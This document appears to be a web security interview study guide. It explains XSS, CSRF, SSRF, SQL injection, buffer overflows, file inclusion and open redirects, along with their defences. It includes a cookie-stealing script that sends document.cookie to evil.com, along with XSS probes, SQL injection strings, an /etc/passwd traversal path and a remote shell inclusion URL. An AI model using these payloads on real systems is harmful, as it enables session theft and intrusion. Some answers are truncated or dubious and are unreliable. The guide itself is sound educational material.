# Application / Web Application Security

### Describe the last program or script that you wrote. What problem did it solve? 

### How would you implement a secure login field on a high traffic website where performance is a consideration? 

The answer you’re looking for here is that TLS is a must for the entire site at this point, and that there are very few situations where you shouldn’t insist on encryption. 

### What are the various ways to handle account brute forcing? 

account lockouts, IP restrictions, fail2ban, commercial versions thereof, etc. 

### What is XSS, stored XSS, reflected XSS and DOM-based XSS?

**XSS:** injects malicious code into a vulnerable web application. XSS differs from other web attack vectors (e.g., SQL injections), in that it does not directly target the application itself. Instead, the users of the web application are the ones at risk. 

**Stored XSS:** also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application. Stored Cross-site scripting vulnerabilities happens when the payload is saved, for example in a database and then is executed when a user opens the page. Stored cross-site scripting is very dangerous for a number of reasons: 

**Reflected XSS:** Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user’s browser. The script is embedded into a link, and is only activated once that link is clicked on. A reflected XSS vulnerability happens when the user input from a URL or POST data is reflected on the page without being stored. This means that an attacker has to send a crafted link or post form to the victim to insert the payload, and the victim should click the link. Historically this kind of payload was sometimes caught by built-in browser XSS filters (e.g. Chrome's XSS Auditor, IE's XSS Filter), but these have since been removed/deprecated (Chrome removed the XSS Auditor in 2019), so they should not be relied on for protection. 

**DOM-based XSS:** an advanced type of XSS attack which is made possible when the web application’s client side scripts write user provided data to the Document Object Model (DOM). The data is subsequently read from the DOM by the web application and outputted to the browser. If the data is incorrectly handled, an attacker can inject a payload, which will be stored as part of the DOM and executed when the data is read back from the DOM. 



`<img src=””>` will often load content from other websites, making a cross-origin HTTP request. 

### How would you hunt for XSS?

Map every place user input can enter and later be rendered (URL params, form fields, headers, cookies, path, and stored data shown back to users). Inject a unique marker, then context-appropriate payloads (`"><svg onload=alert(1)>`, `';alert(1)//`, event handlers) and see whether it is reflected or stored unencoded and executed. Test each output context separately — HTML body, HTML attribute, JavaScript, URL, and CSS each need a different breakout. For DOM XSS, trace client-side sources (`location`, `document.referrer`) to dangerous sinks (`innerHTML`, `document.write`, `eval`). Proxies (Burp/ZAP) and their scanners speed this up, but manual context analysis catches what scanners miss.

#### Follow up: Give me an example of XSS and what you can do with it.

Example: a comment field stores `<script>fetch('https://evil.com/?c='+document.cookie)</script>`, which then runs in the browser of everyone who views the comment (stored XSS). With XSS you can steal session cookies/tokens, perform actions as the victim, log keystrokes, rewrite the page for phishing, hook the browser with a framework like BeEF, or chain to a browser exploit. `HttpOnly` cookies blunt cookie theft but not the ability to act as the user.

### Prevention on XSS 

Input Validation and Output Sanitization, with focus on the latter. 

XSS can be prevented by the use of the proper available sanitizers. Web developers have to have an eye on the gateways through which they receive information and these are the gateways which must be made as a barrier for malicious files. 

There are software or applications available for doing this, like the XSS Me for Firefox and DOM snitch for Google Chrome. Also, the default web application firewall formula, popularly 

In addition, a strong CSP provides an additional layer of protection against XSS.

### What is CSP (Content Security Policy) ?

An HTTP response header (`Content-Security-Policy`) that tells the browser which sources it may load or execute content from — scripts, styles, images, frames, etc. By whitelisting trusted origins and forbidding inline scripts and `eval`, it adds defense-in-depth against XSS and data injection. Example: `default-src 'self'; script-src 'self' https://cdn.example.com`. Inline scripts can be allowed safely with a per-response nonce or hash. CSP is a mitigation layer, not a replacement for output encoding.

### Cross-Site Request Forgery CSRF

#### What is CSRF?

Cross-Site Request Forgery tricks an authenticated user's browser into sending an unwanted state-changing request to a site where they are already logged in, abusing the browser's automatic inclusion of cookies. Example: a hidden auto-submitting form on a malicious page fires a fund transfer to the victim's bank using their live session; the server cannot tell it from a genuine request. Defenses: anti-CSRF tokens, `SameSite` cookies, verifying Origin/Referer, and re-authentication for sensitive actions.

#### How does one defend against CSRF? 

Nonce required by the server for each page or each request is an accepted, albeit not foolproof, method. 

When CSRF attacks, you can opt for two available methods. 

Firstly, with every request try to include a random token. In this way a unique string of tokens will be generated which is a good safeguard. 

Secondly, for each field of form, try using different names. This will somewhat help you in becoming anonymous due to the entry of so many different names and thus will behave as a safeguard from CSRF attacks. 

In addition, consider Same-Site Cookie for preventing CSRF attacks.

### What is SSRF Server Side Request Forgery?

Server-Side Request Forgery makes the server itself issue attacker-chosen requests. By controlling a URL the server fetches, an attacker reaches destinations they cannot hit directly — internal-only services, admin panels, or the cloud metadata endpoint (`http://169.254.169.254/`) to steal instance credentials — and can port-scan the internal network. Defenses: allowlist outbound destinations, block private/link-local ranges and the metadata IP, restrict URL schemes, and never pass raw user-supplied URLs to server-side fetchers.

### What is SQL Injection? Give me an example.

SQL injection happens when untrusted input is concatenated into a SQL query, letting an attacker change the query's logic. Example: a login query `SELECT * FROM users WHERE user='$u' AND pass='$p'` with `u = admin'--` becomes `...WHERE user='admin'--' AND pass='...'`, commenting out the password check and logging in as admin. Impact ranges from reading/modifying/deleting data and dumping the whole database to, in some configurations, command execution on the host.

#### Follow up:
1. **SQL Injection prevention:** parameterized queries / prepared statements (the primary fix), ORMs that parameterize, input validation, least-privilege database accounts, and a WAF as a backstop.
2. **What is blind SQL Injection?** SQLi where the app returns no data or error messages, so the attacker infers results indirectly — *boolean-based* (a true/false condition changes the response) or *time-based* (e.g. `' OR SLEEP(5)--` delays the response when the condition is true).

### HTTP Related

#### What’s the difference between HTTP and HTML? 

One is the networking/application protocol and the other is the markup language 

#### How does HTTP handle state? 

It doesn’t. Not natively. Good answers are things like “cookies”, but the best answer is that cookies are a hack to make up for the fact that HTTP doesn’t do it itself. 

#### HTTP Public Key Pinning

(HPKP)

Deprecated by Google Chrome

#### Cookies 

httponly - cannot be accessed by javascript.

#### SQLi 

(Wo)man in the browser (flash / java applets) (malware).

Validation / sanitisation of webforms.

#### POST 

Form data. 

#### GET 

Queries. 

Visible from URL.

### What is Exfiltration? Data Exfiltration 

Infiltration is the method by which you enter or smuggle elements into a location. Exfiltration is just the opposite: getting sensitive information or objects out of a location without being discovered. In an environment with high security, this can be extremely difficult but not impossible. Again we turn to our friends in the fake delivery uniforms wandering around the building, and see that yes there are ways to get in and out without a lot of issues. 

Data exfiltration or Data extrusion is the unauthorized transfer of data from a computer. The transfer of data can be manual by someone with physical access to the computer or automated, carried out through malware over a network. Because data routinely moves in and out of networked enterprises, data exfiltration can closely resemble normal network traffic, making detection of exfiltration attempts challenging for IT security groups. 

### What is SOP (Same-origin policy)?

A browser security mechanism that restricts how a document or script loaded from one origin can interact with a resource from another origin. It does not stop cross-origin requests from being sent (that's why CSRF exists); it stops a script from reading the response or accessing the DOM/cookies of a different origin. An origin is the combination of scheme, host, and port. 

### What is CORS (Cross-origin resource sharing)?

Cross-Origin Resource Sharing. Can specify allowed origins in HTTP headers. Sends a preflight request with options set asking if the server approves, and if the server approves, then the actual request is sent (eg. should client send auth cookies).

### What is SRI (Sub-Resource Integrity)?

Subresource Integrity lets a page pin the expected content of an external script or stylesheet via an `integrity` attribute holding a cryptographic hash. The browser fetches the resource (e.g. from a CDN) and runs it only if the hash matches, so a tampered or compromised third-party file is rejected. Example: `<script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>`.

### Buffer Overflow

#### How does a buffer overflow work? 

A program writes more data into a fixed-size buffer than it can hold, overwriting adjacent memory. On the stack, overflowing a local buffer can overwrite the saved return address; when the function returns, execution jumps to an attacker-chosen location — injected shellcode, or (with a non-executable stack) a ROP chain built from existing code. The root cause is missing bounds checks, often via unsafe functions like `strcpy`, `gets`, or `sprintf`.

#### How can one defend against buffer overflows? 

- Safe coding: bounds-check all copies, use length-limited functions (`strncpy`, `snprintf`), and prefer memory-safe languages (Rust, Go, Java).
- Compiler/OS mitigations: stack canaries, DEP/NX (non-executable stack), ASLR, `FORTIFY_SOURCE`, and control-flow integrity.
- Process: code review, static analysis, and fuzzing to find overflows before release.

### Directory traversal 

Find directories on the server you’re not meant to be able to see.

There are tools that do this.

How to prevent?

### APIs 

Think about what information they return. 

And what can be sent.

### Beefhook

Get info about Chrome extensions.

### User agents

Is this a legitimate browser? Or a botnet?

### Browser extension take-overs

Miners, cred stealers, adware.

### Local file inclusion

A flaw where user input is used to include a file from the local server (e.g. `?page=../../../../etc/passwd`), letting an attacker read sensitive files or, combined with tricks like log poisoning or an uploaded file, achieve code execution. Prevent with input allowlisting and never passing user input into include/`require` paths.

### Remote file inclusion (not as common these days)

Like LFI, but the application includes a file from a remote URL supplied by the attacker (e.g. `?page=http://evil.com/shell.txt`), directly executing attacker code on the server. Rare today because most runtimes disable remote includes by default (e.g. PHP `allow_url_include=Off`).

### Web vuln scanners. 

Automated tools that crawl an app and probe for common flaws (XSS, SQLi, misconfigurations, outdated components) — e.g. Burp Suite, OWASP ZAP, Nikto, Acunetix. Good for breadth and low-hanging fruit, but they miss logic flaws and produce false positives, so manual testing is still needed.

### SQLmap.

An open-source tool that automates detecting and exploiting SQL injection — enumerating databases, dumping tables, and in some cases getting an OS shell. Widely used to confirm and demonstrate the impact of SQLi found during testing.

### Malicious redirects.

Open-redirect and forced-redirect flaws where an app sends users to an attacker-controlled URL (e.g. `?next=http://evil.com`), used for phishing, credential theft, or malware delivery while appearing to come from a trusted site. Prevent by allowlisting redirect targets and avoiding user-controlled redirect destinations.